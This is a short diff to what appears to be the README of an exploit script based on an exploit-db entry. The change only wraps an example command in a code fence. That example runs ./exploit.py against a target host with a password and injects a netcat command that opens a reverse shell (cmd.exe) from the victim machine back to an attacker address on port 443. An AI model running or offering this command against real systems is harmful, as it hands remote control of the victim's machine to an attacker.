@@ -5,6 +5,6 @@ Based on Steps described here: https://www.exploit-db.com/exploits/46802
  
  
 Example Usage (opening reverse shell using netcat on the victim machine)
-
+```
 ./exploit.py "C:\\Temp\\nc.exe 192.168.0.10 443 -e cmd.exe" https://192.168.0.100:443 supersecurepassword
- 
+ ```
